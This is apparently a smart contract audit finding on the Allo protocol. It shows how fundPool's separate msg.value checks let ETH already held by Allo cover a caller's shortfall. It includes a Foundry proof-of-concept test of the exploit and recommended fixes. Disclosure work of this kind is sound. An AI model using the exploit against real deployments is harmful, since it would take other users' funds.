# Allo contract's funds can be used for paying funding fees
## Summary
Allo contract's funds can be used for paying funding fees.
## Vulnerability Detail
Allo contract can hold funds in two ways: 

1.  A _pool admin_ mistakenly sends funds when using _registerRecipient_, which will be locked in Allo, since the msg.value is not used when calling the strategy's _registerRecipient_.
2. Funds are sent as a donations, as stated in the docs: _Funds sent to Allo.sol are considered a gift to the Allo protocol team_

Once Allo contract holds some funds, a user can fund a pool that uses the native token with a lower _msg.value_ than _amount_ parameter. When paying the _feeAmount_ and _amountAfterFee_ for funding the pool the _Transfer_ library will be used. The check _msg.value < amount_ will pass because the check is done separately for both payments. This will result in funds being sent from Allo in order to fund the strategy contract, since the _msg.value_ will not be sufficient. PoC:

          function test_fundPoolAttacker() public {
            uint256 percentFee = 1e17;
    
            allo().updatePercentFee(percentFee); // 10%
            address attacker = makeAddr("Attacker");
    
            vm.deal(pool_admin(), 100 * 1e18);
            vm.deal(attacker, 100 * 1e18);
    
            console.log("***** STARTING BALANCES *****");
            console.log("Pool admin ETH balance: %d", address(pool_admin()).balance);
            console.log("Attacker ETH balance: %d", attacker.balance);
            console.log("Allo contract ETH balance: %d", address(allo()).balance);
            console.log("Treasury ETH balance: %d", allo().getTreasury().balance); 
            console.log("*****************************");
    
            vm.prank(pool_admin());
            uint256 poolId = allo().createPoolWithCustomStrategy(
                poolProfile_id(), strategy, "0x", NATIVE, 0, metadata, pool_managers()
            );
            vm.prank(pool_admin());
            // Pool admin mistakenly sends ETH to Allo contract
            // Or funds are sent as a donations, as stated in the docs: 
            // "Funds sent to Allo.sol are considered a gift to the Allo protocol team"
            allo().registerRecipient{value: 100 * 1e18}(poolId, bytes(""));
    
            vm.prank(attacker); // Sends 90 in msg.value, but 100 in the amount parameter
            allo().fundPool{value: 90 * 1e18}(poolId, 100 * 1e18);
    
            console.log("***** FINAL BALANCES *****");
            console.log("Pool admin ETH balance: %d", address(pool_admin()).balance);
            console.log("Attacker ETH balance: %d", attacker.balance);
            console.log("Allo contract ETH balance: %d", address(allo()).balance);
            console.log("Treasury ETH balance: %d", allo().getTreasury().balance);
            console.log("Strategy contract ETH balance: %d",address(strategy).balance); // Receives the whole 90 sent in msg.value
            console.log("*****************************");
            // pool_admin is not able to get funds back
        }

Output:
  ***** STARTING BALANCES *****
  Pool admin ETH balance: 100000000000000000000
  Attacker ETH balance: 100000000000000000000
  Allo contract ETH balance: 0
  Treasury ETH balance: 0

## Impact
Mistakenly sent funds and donation funds can be used for paying the fees of funding a pool that uses the native token.

Transfer library function used for making the payments:

Documentation of funding a pool:

Register recipient function which is payable, but the _msg.value_ will be sent to Allo instead of the strategy:

## Tool used

Manual Review and Foundry

## Recommendation
Even if sending funds mistakenly to the contract when using _registerRecipient()_ may be users mistake, I would make this function non payable. Also, when funding a pool, there must be a check that _msg.value > amount (parameter)_ when using native token in order to prevent Allo from paying instead of the user.
